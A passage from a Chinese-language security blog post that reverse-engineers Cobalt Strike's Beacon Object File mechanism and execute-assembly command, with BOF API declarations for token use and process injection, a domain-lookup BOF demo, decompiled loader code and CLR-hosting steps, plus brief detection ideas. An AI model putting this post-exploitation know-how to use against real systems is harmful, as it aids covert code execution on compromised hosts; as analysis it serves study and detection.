class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Token Functions */</span></div><div class="line"><span class="function">DECLSPEC_IMPORT BOOL   <span class="title">BeaconUseToken</span><span class="params">(HANDLE token)</span></span>;</div><div class="line"><span class="function">DECLSPEC_IMPORT <span class="keyword">void</span>   <span class="title">BeaconRevertToken</span><span class="params">()</span></span>;</div><div class="line"><span class="function">DECLSPEC_IMPORT BOOL   <span class="title">BeaconIsAdmin</span><span class="params">()</span></span>;</div><div class="line"></div><div class="line"><span class="comment">/* Spawn+Inject Functions */</span></div><div class="line"><span class="function">DECLSPEC_IMPORT <span class="keyword">void</span>   <span class="title">BeaconGetSpawnTo</span><span class="params">(BOOL x86, <span class="keyword">char</span> * buffer, <span class="keyword">int</span> length)</span></span>;</div><div class="line"><span class="function">DECLSPEC_IMPORT <span class="keyword">void</span>   <span class="title">BeaconInjectProcess</span><span class="params">(HANDLE hProc, <span class="keyword">int</span> pid, <span class="keyword">char</span> * payload, <span class="keyword">int</span> p_len, <span class="keyword">int</span> p_offset, <span class="keyword">char</span> * arg, <span class="keyword">int</span> a_len)</span></span>;</div><div class="line"><span class="function">DECLSPEC_IMPORT <span class="keyword">void</span>   <span class="title">BeaconInjectTemporaryProcess</span><span class="params">(PROCESS_INFORMATION * pInfo, <span class="keyword">char</span> * payload, <span class="keyword">int</span> p_len, <span class="keyword">int</span> p_offset, <span class="keyword">char</span> * arg, <span class="keyword">int</span> a_len)</span></span>;</div><div class="line"><span class="function">DECLSPEC_IMPORT BOOL   <span class="title">BeaconSpawnTemporaryProcess</span><span class="params">(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pInfo)</span></span>;</div><div class="line"><span class="function">DECLSPEC_IMPORT <span class="keyword">void</span>   <span class="title">BeaconCleanupProcess</span><span class="params">(PROCESS_INFORMATION * pInfo)</span></span>;</div><div class="line"></div><div class="line"><span class="comment">/* Utility Functions */</span></div><div class="line"><span class="function">DECLSPEC_IMPORT BOOL   <span class="title">toWideChar</span><span class="params">(<span class="keyword">char</span> * src, <span class="keyword">wchar_t</span> * dst, <span class="keyword">int</span> max)</span></span>;</div></pre></td></tr></table></figure></p><h2 id="0x03-动态函数解析-DFR"><a href="#0x03-动态函数解析-DFR" class="headerlink" title="0x03 动态函数解析(DFR)"></a>0x03 动态函数解析(DFR)</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;动态函数解析，即Dynamic Function Resolution (DFR)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以下demo的功能是查找当前域，需要使用两个API函数DsGetDcNameA,NetApiBufferFree都是由NETAPI32模块进行导出。</p><ul><li>DECLSPEC_IMPORT：导入函数的关键字</li><li>WINAPI：函数调用约定，一般API函数都是这个</li><li>NETAPI32：函数所在的模块名</li><li>DsGetDcNameA/NetApiBufferFree：函数名称</li></ul><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">/<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span> </span></div><div class="line">/<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></div><div class="line">/<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dsgetdc.h&gt;</span> </span></div><div class="line">/<span class="meta">#<span class="meta-keyword">include</span> <span class="string">"beacon.h"</span> </span></div><div class="line">DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameA(LPVOID, LPVOID, LPVOID, LPVOID, ULONG, LPVOID)<span class="comment">; </span></div><div class="line">DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID)<span class="comment">; </span></div><div class="line">void go(char * args, <span class="built_in">int</span> alen) &#123; </div><div class="line">DWORD dwRet<span class="comment">; </span></div><div class="line">PDOMAIN_CONTROLLER_INFO pdcInfo；</div><div class="line">dwRet = NETAPI32$DsGetDcNameA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;pdcInfo)<span class="comment">; </span></div><div class="line"><span class="keyword">if</span> (ERROR_SUCCESS == dwRet) &#123; </div><div class="line">BeaconPrintf(CALLBACK_OUTPUT, <span class="string">"%s"</span>, pdcInfo-&gt;DomainName)<span class="comment">; </span></div><div class="line">&#125; </div><div class="line">NETAPI32$NetApiBufferFree(pdcInfo)<span class="comment">; </span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以使用<a href="https://github.com/dtmsecurity/bof_helper" target="_blank" rel="external">bof_help</a>这个工具自动修改符合BOF格式的函数原型。但目前来说可能不是很好用了。参考自<a href="https://idiotc4t.com/weaponization/bof-weaponization" target="_blank" rel="external">https://idiotc4t.com/weaponization/bof-weaponization</a></p><h2 id="0x04-Obj文件解析"><a href="#0x04-Obj文件解析" class="headerlink" title="0x04 Obj文件解析"></a>0x04 Obj文件解析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OBj文件的文件类型是COFF Object，使用<code>dumpbin /all obj_path</code>解析Obj文件格式。Obj文件首先是_IMAGE_FILE_HEADER，保存着整个文件基本信息，然后依次保存着每个节区的<code>SECTION HEADER</code>和节区内容。然后接着就是重定位表，符号表。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文件头格式如下：<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">typedef struct _IMAGE_FILE_HEADER &#123;</div><div class="line">    <span class="type">WORD</span>    <span class="type">Machine</span>;</div><div class="line">    <span class="type">WORD</span>    <span class="type">NumberOfSections</span>;</div><div class="line">    <span class="type">DWORD</span>   <span class="type">TimeDateStamp</span>;</div><div class="line">    <span class="type">DWORD</span>   <span class="type">PointerToSymbolTable</span>;</div><div class="line">    <span class="type">DWORD</span>   <span class="type">NumberOfSymbols</span>;</div><div class="line">    <span class="type">WORD</span>    <span class="type">SizeOfOptionalHeader</span>;</div><div class="line">    <span class="type">WORD</span>    <span class="type">Characteristics</span>;</div><div class="line">&#125; <span class="type">IMAGE_FILE_HEADER</span>, *<span class="type">PIMAGE_FILE_HEADER</span>;</div></pre></td></tr></table></figure></p><ul><li>Machine为0x14c，表示这是一个x86的Obj</li><li>NumberOfSections为4，说明有4个Section</li><li>TimeDateStamp是时间戳</li><li>PointerToSymbolTable;指向符号表</li><li>NumberOfSymbols：符号个数<figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">FILE HEADER VALUES</div><div class="line">             <span class="number">14</span>C machine (x86)</div><div class="line">               <span class="number">4</span> <span class="built_in">number</span> <span class="keyword">of</span> sections</div><div class="line">        <span class="number">63</span>*E60*D <span class="built_in">time</span> <span class="built_in">date</span> stamp Thu ***  <span class="number">6</span> <span class="number">13</span>:*:<span class="number">29</span> <span class="number">20</span>**</div><div class="line">             <span class="number">1E6</span> <span class="built_in">file</span> pointer <span class="keyword">to</span> symbol table</div><div class="line">               D <span class="built_in">number</span> <span class="keyword">of</span> symbols</div><div class="line">               <span class="number">0</span> size <span class="keyword">of</span> optional header</div><div class="line">               <span class="number">0</span> characteristics</div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;节区头的结构体如下：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">typedef struct _IMAGE_SECTION_HEADER &#123;</div><div class="line">    <span class="keyword">BYTE </span>   Name[IMAGE_SIZEOF_SHORT_NAME]<span class="comment">;</span></div><div class="line">    union &#123;</div><div class="line">            DWORD   PhysicalAddress<span class="comment">;</span></div><div class="line">            DWORD   VirtualSize<span class="comment">;</span></div><div class="line">    &#125; Misc<span class="comment">;</span></div><div class="line">    DWORD   VirtualAddress<span class="comment">;</span></div><div class="line">    DWORD   SizeOfRawData<span class="comment">;</span></div><div class="line">    DWORD   PointerToRawData<span class="comment">;</span></div><div class="line">    DWORD   PointerToRelocations<span class="comment">;</span></div><div class="line">    DWORD   PointerToLinenumbers<span class="comment">;</span></div><div class="line">    WORD    NumberOfRelocations<span class="comment">;</span></div><div class="line">    WORD    NumberOfLinenumbers<span class="comment">;</span></div><div class="line">    DWORD   Characteristics<span class="comment">;</span></div><div class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER<span class="comment">;</span></div></pre></td></tr></table></figure></p><ul><li>Name:表示节区的名字</li><li>SizeOfRawData：表示节区数据的大小</li><li>PointerToRawData：表示节区数据的偏移或者指针。<br>  <img src="http://hacky.wang/blog/20221006/mDIFeQ5nddDi.png?imageslim" alt="mark"></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;text段<br>    <img src="http://hacky.wang/blog/20221006/MptBSPCSbpal.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;重定位表<br>    <img src="http://hacky.wang/blog/20221006/w8Esfhuxpqen.png?imageslim" alt="mark"></p><h2 id="0x05-服务端BOF实现原理"><a href="#0x05-服务端BOF实现原理" class="headerlink" title="0x05 服务端BOF实现原理"></a>0x05 服务端BOF实现原理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先是如何定位入口点，如果熟悉Cobalt Strike伪源码的，应该知道Cobalt Strike的命令分发执行位于BeaconConsole.java的<code>public void actionPerformed(ActionEvent var1)</code>函数，如果不熟悉Cobalt Strike伪源码呢，使用notepad++的文件夹搜索功能，搜索<code>inline-execute</code>也可以定位到<code>public void actionPerformed(ActionEvent var1)</code>函数。<br>    <img src="http://hacky.wang/blog/20220620/vekIhsaPBo9u.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;显然，可以看见，当执行<code>inline-execute</code>命令时，首先会将命令中的objectfile的路径解析出来，然后作为参数传入<code>InlineExecuteObject</code>函数。<br>    <img src="http://hacky.wang/blog/20220620/pUGP2rSrapKT.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>InlineExecuteObject</code>函数中，首先，调用DataUtils.getBeacon获取Beacon的各种信息，这里使用到的是CPU架构。然后传入<code>this.InlineExecuteObject</code>函数中。最终调用go()这个函数。<br>    <img src="http://hacky.wang/blog/20220620/n4LkdTY9m5vR.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在go这个函数中，依次获取架构，是x64还是x86，并判断Obj的架构和beacon的架构是否一致，一致才可以继续<br>    <img src="http://hacky.wang/blog/20220620/nArcas0kygdP.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后读取Object文件，分别解析Code段，RData段，Data段，和Relocations段，复制这些段的数据，复制原理如下，首先，通过解析Header中的数据，可以获取各个段的起始地址和大小，这样就可以获取各个段的范围，然后就可以获取指定段的内容。<br>    <img src="http://hacky.wang/blog/20220620/bAOTHyCmqais.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220620/qG4GLthj00qY.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>getRelocations()</code>函数中，会根据不同的段，插入不同的Magic Number。例如，如果是.rdata，则会插入1024，如果是.data，则会插入1025，如果是.text，则会插入1026，如果是DynamicFunction，则会插入1027，最后以插入1028结尾。<br>    <img src="http://hacky.wang/blog/20220620/W4shAFvgNzou.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同时，可以看到插入数据的结构，首先是插入的Type(类型)，然后插入一个Magic Number,第三是插入偏移，最后插入在段中的偏移。有个例外，针对DynamicFunction这块的处理可能需要插入其他的数据。<br>    <img src="http://hacky.wang/blog/20220620/JI701R83bkMS.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着是构造命令，依次添加命令号，添加obj的入口点，添加code，添加Rdata，添加data，添加Relocations，和Arguments，这个Arguments没理解是什么东西。<br>    <img src="http://hacky.wang/blog/20220620/7cJRR5CvXTdj.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220620/S7APY2D3K5Al.png?imageslim" alt="mark"></p><h2 id="0x06-beacon端调用原理分析"><a href="#0x06-beacon端调用原理分析" class="headerlink" title="0x06 beacon端调用原理分析"></a>0x06 beacon端调用原理分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;beacon分为loader和payload，loader可以自行开发，payload采用反射注入的方式进行加载，默认情况下，导出表有两个函数，一个是<code>ReflectiveLoader</code>另外一个是<code>DllEntryPoint</code>。在执行payload的时候，优先执行ReflectiveLoader，在处理完PE数据后，跳转到<code>DllEntryPoint</code>函数，然后根据dll加载的原因选择进行数据的初始化，还是进行工作。<br>    <img src="http://hacky.wang/blog/20220621/dSnpaJImNvt7.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在4.1的Cobalt Strike生成的beacon中，大概在这个地方(Sub_336560_CommandDisPatch)进行命令操作。<br>    <img src="http://hacky.wang/blog/20220621/exGqnQP1GMpi.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这是服务端传来的原始数据，显然，前四个字节正好是100，为命令号，和cobaltstrike发送命令数据的结构一致。<br>    <img src="http://hacky.wang/blog/20220621/WBk5efP42kHE.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220621/ObjoluTJl3MY.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在函数<code>Sub_336560_CommandDisPatch</code>中，显然可以看到，首先解析出命令号，然后将除了命令号以外的数据作为第二个参数传入，将结果作为第三个参数传入，用以获取执行的结果。<br>    <img src="http://hacky.wang/blog/20220621/wJHauWaHdJli.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据命令号，选择不同需要执行的函数，此处将该函数命名为<code>Sub_32D020_inline_execute</code>,在<code>Sub_32D020_inline_execute</code>中，首先依次解析Code段，RData段，Data段，Relocations段，和Arguments。<br>    <img src="http://hacky.wang/blog/20220621/9WaE6eHifaRK.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;随后，便开始解析Relocations段，cobaltstrike通过不同的硬编码数据将不同的数据类型进行分割，0x400表示.rdata段，0x401表示.data段，0x402表示.text段，0x403表示DynamicFunction，0x404则表示结束。<br>    <img src="http://hacky.wang/blog/20220621/KnJymTWvmyj9.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Sub_32D4F4_WriteOffset</code>函数的目的是修改代码段中的一些常量或者DynamicFunction的地址，因为在汇编层级，这些地址都是偏移量，所以需要计算偏移量并写入代码中，才能实现调用。<br>    <img src="http://hacky.wang/blog/20220621/2nH6quhrrMif.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220621/WxNuQYEu6DnF.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后执行shellcode<br>    <img src="http://hacky.wang/blog/20220621/up02oD67Upiy.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以下是传入的数据。显然，第一行是命令号和EntryPoint，然后下面是code段和rdata段，再下面是Relocations段。<br>    <img src="http://hacky.wang/blog/20220621/T8PSHxAlkHVT.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220621/noddhlG1332V.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后在对比一下原始的code段，和需要执行的shellcode的区别，很显然，关于常量的偏移地址是不同的。也就是说此处做了重定位。<br>    <img src="http://hacky.wang/blog/20220621/P4VHTIPSQbHE.png?imageslim" alt="mark"></p><h2 id="0x07-检测思路"><a href="#0x07-检测思路" class="headerlink" title="0x07 检测思路"></a>0x07 检测思路</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;常规的工具(BeaconEye)可能没有什么好的检测思路，我之前设想过，通过beaconEye有没有可能检测BOF，但是后来仔细想了一下发现不行，因为BeaconEye通过检测内存中的特征码实现的，但是BOF在调用执行完shellcode的时候就被释放了，可能无法检测。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从流量角度看，传入的流量数据，起始的命令号(100)以及getRelocations中的Magic Number是否可以作为检测依据？</p><h2 id="0x08-execuate-assembly"><a href="#0x08-execuate-assembly" class="headerlink" title="0x08 execuate-assembly"></a>0x08 execuate-assembly</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在CobaltStrike3中，新增了名为<code>execuate-assembly</code>命令，该命令本质是实现了在内存中加载.Net程序集。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行<code>execute-assembly</code>命令之后，判断是否存在参数，如果存在参数，得到CSharp程序路径和参数，分别传入ExecuteAssembly，如果不存在参数，只需要传入CSharp程序路径。<br>    <img src="http://hacky.wang/blog/20221008/K1EkkcUr1ty5.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>ExecuteAssembly</code>函数中，首先读取Charp程序，并判断其是否是一个.NET程序，然后根据Beacon判断是否是64位系统，如果是X64的话，则会加载X64的装载程序初始化CRL环境并加载.NET程序<br>    <img src="http://hacky.wang/blog/20221008/JkLeI6gSyarK.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;读取<code>resources/invokeassembly.dll</code>文件，该程序的作用是初始化CLR以及加载.Net程序集，然后将<code>invokeassembly.dll</code>,<code>CSharp程序</code>，以及一些配置信息一起发送给beacon。<br>    <img src="http://hacky.wang/blog/20221008/kVUxJSQWSpiv.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;beacon.exe，第70号命令即为<code>execte-assembly</code>,其逻辑也很简单，在解析玩配置信息之后，拉起一个Rundll32进程，然后将invokeassembly.dll注入进去，invokeassembly.dll就会在rundll32中初始化环境并加载程序集了。<br>    <img src="http://hacky.wang/blog/20221008/mHYYLhIpySQN.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;转储了invokeassembly.dll，拖到IDA中，发现其和beacon一样采用了反射注入的方式。直接定位到关键函数。<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line">__int64 __fastcall sub_180001470(__int64 a1,<span class="built_in"> const </span>void *a2, unsigned<span class="built_in"> int </span>a3)</div><div class="line">&#123;</div><div class="line">[.....]</div><div class="line">  v6 = GetStdHandle(0xFFFFFFF5);</div><div class="line">  SetStdHandle(0xFFFFFFF4, v6);</div><div class="line"> <span class="built_in"> if </span>( !sub_180001294(&amp;v16) )</div><div class="line">  &#123;</div><div class="line">    result = Sub_1800022B8_Output(<span class="string">"[-] Failed to create the runtime host\n"</span>, v7);</div><div class="line">   <span class="built_in"> goto </span><span class="class">LABEL_27;</span></div><div class="line">  &#125;</div><div class="line">  v9 = (*(*v16 + 80i64))(v16);</div><div class="line"> <span class="built_in"> if </span>( v9 &lt; 0 )</div><div class="line">  &#123;</div><div class="line">    v10 = <span class="string">"[-] CLR failed to start w/hr 0x%08lx\n"</span>;</div><div class="line">LABEL_5:</div><div class="line">    result = Sub_1800022B8_Output(v10, v9);</div><div class="line">   <span class="built_in"> goto </span><span class="class">LABEL_27;</span></div><div class="line">  &#125;</div><div class="line"> <span class="built_in"> if </span>( v18 )</div><div class="line">    ((*v18)[2])(v18);</div><div class="line">  v18 = 0i64;</div><div class="line">  v9 = (*(*v16 + 104i64))(v16, &amp;v18);</div><div class="line"> <span class="built_in"> if </span>( v9 &lt; 0 )</div><div class="line">  &#123;</div><div class="line">    v10 = <span class="string">"[-] ICorRuntimeHost::GetDefaultDomain failed w/hr 0x%08lx\n"</span>;</div><div class="line">   <span class="built_in"> goto </span><span class="class">LABEL_5;</span></div><div class="line">  &#125;</div><div class="line">  v11 = v18;</div><div class="line"> <span class="built_in"> if </span>( !v18 )</div><div class="line">  &#123;</div><div class="line">    sub_180001DA0(0x80004003i64);</div><div class="line">    __debugbreak();</div><div class="line">  &#125;</div><div class="line"> <span class="built_in"> if </span>( v22 )</div><div class="line">    (*(*v22 + 16i64))(v22);</div><div class="line">  v22 = 0i64;</div><div class="line">  v12 = *v11;</div><div class="line">  v13 = sub_180001000(&amp;v22);</div><div class="line">  v9 = (*v12)(v11, &amp;unk_180010510, v13);</div><div class="line"> <span class="built_in"> if </span>( v9 &lt; 0 )</div><div class="line">  &#123;</div><div class="line">    v10 = <span class="string">"[-] Failed to get default AppDomain w/hr 0x%08lx\n"</span>;</div><div class="line">   <span class="built_in"> goto </span><span class="class">LABEL_5;</span></div><div class="line">  &#125;</div><div class="line">  rgsabound.cElements = v3;</div><div class="line">  rgsabound.l<span class="class">Lbound = 0;</span></div><div class="line">  v14 = SafeArrayCreate(0x11u, 1u, &amp;rgsabound);</div><div class="line">  SafeArrayLock(v14);</div><div class="line">  memmove(v14-&gt;pvData, a2, v3);</div><div class="line">  SafeArrayUnlock(v14);</div><div class="line">[.....]</div><div class="line"> <span class="built_in"> if </span>( v17 )</div><div class="line">    (*(*v17 + 16i64))(v17);</div><div class="line">  v17 = 0i64;</div><div class="line">  v9 = (*(*v15 + 360i64))(v15, v14, &amp;v17);</div><div class="line"> <span class="built_in"> if </span>( v9 &lt; 0 )</div><div class="line">  &#123;</div><div class="line">    v10 = <span class="string">"[-] Failed to load the assembly w/hr 0x%08lx\n"</span>;</div><div class="line">   <span class="built_in"> goto </span><span class="class">LABEL_5;</span></div><div class="line">  &#125;</div><div class="line">  v20 = v17;</div><div class="line"> <span class="built_in"> if </span>( v17 )</div><div class="line">    (*(*v17 + 8i64))(v17);</div><div class="line">[.....]</div><div class="line"> <span class="built_in"> if </span>( v17 )</div><div class="line">    result = (*(*v17 + 16i64))(v17);</div><div class="line"> <span class="built_in"> if </span>( v22 )</div><div class="line">    result = (*(*v22 + 16i64))(v22);</div><div class="line"> <span class="built_in"> if </span>( v18 )</div><div class="line">    result = ((*v18)[2])(v18);</div><div class="line"> <span class="built_in"> return </span>result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先初始化CLR环境，根据不同的版本采用不同的函数初始化CLR环境，<br>    <img src="http://hacky.wang/blog/20221008/vOqlGeHHW0Qb.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;启动CLR环境<br>    <img src="http://hacky.wang/blog/20221008/HWJnw2B9Csga.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取默认的程序域<br>    <img src="http://hacky.wang/blog/20221008/uqr4o9zaz4v5.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;加载assembly<br>    <img src="http://hacky.wang/blog/20221008/FxhAB2MGbTOw.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取入口点，并执行。<br>    <img src="http://hacky.wang/blog/20221008/Xrq72Vs8oyip.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;idiotc4t在<a href="https://idiotc4t.com/defense-evasion/cobaltstrike-executeassembly-realization" target="_blank" rel="external">Execute-Assembly实现</a>中仔细描述了如何编写一段内存加载.Net程序集。首先初始化CLR环境,CLR全称为公共语言运行库，即Common Language Runtime。CLR托管在进程中，是加载和运行.Net程序集的地方，关于CLR的概述可以参考<a href="https://learn.microsoft.com/en-us/dotnet/standard/clr" target="_blank" rel="external">微软关于CLR的描述</a>。常见的windows进程并不会加载CLR环境，可以使用ProcessExplorer或者ProcessHacker等工具查看是否加载CLR环境。加载CLR环境主要分四步:<br>    <img src="http://hacky.wang/blog/20221022/HLDiM7zQzzEN.png?imageslim" alt="mark"></p><ul><li>1) 调用CLRCreateInstance函数以实例化<code>ICLRMetaHost</code>或<code>ICLRMetaHostPolicy</code>接口，CLRCreateInstance函数原型如下，第一个参数为clsid，第二个参数是 riid，第三个参数是返回的接口。</li></ul><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function">HRESULT <span class="title">CLRCreateInstance</span>(<span class="params">  </span></span></div><div class="line"><span class="function"><span class="params">    [<span class="keyword">in</span>]  REFCLSID  clsid,  </span></span></div><div class="line"><span class="function"><span class="params">    [<span class="keyword">in</span>]  REFIID     riid,  </span></span></div><div class="line"><span class="function"><span class="params">    [<span class="keyword">out</span>] LPVOID  * ppInterface  </span></span></div><div class="line"><span class="function"><span class="params"></span>)</span>;</div></pre></td></tr></table></figure><ul><li><p>2) 调用<code>ICLRMetaHost::EnumerateInstalledRuntimes</code>, <code>ICLRMetaHost::GetRuntime</code>或者<code>ICLRMetaHostPolicy::GetRequestedRuntime</code>方法以获取有效的ICLRRuntimeInfo指针。以<code>ICLRMetaHost::GetRuntime</code>为例，第一个参数为pwzVersion，表示 .NET Framework 的版本，riid为标识符，此参数的唯一有效值是 IID_ICLRRuntimeInfo。第三个参数是返回的ICLRRuntimeInfo接口的指针。</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">HRESULT GetRuntime (  </div><div class="line">    [<span class="keyword">in</span>] LPCWSTR pwzVersion,  </div><div class="line">    [<span class="keyword">in</span>] REFIID riid,  </div><div class="line">    [<span class="keyword">out</span>,iid<span class="number">_</span><span class="keyword">is</span>(riid), retval] LPVOID *ppRuntime  </div><div 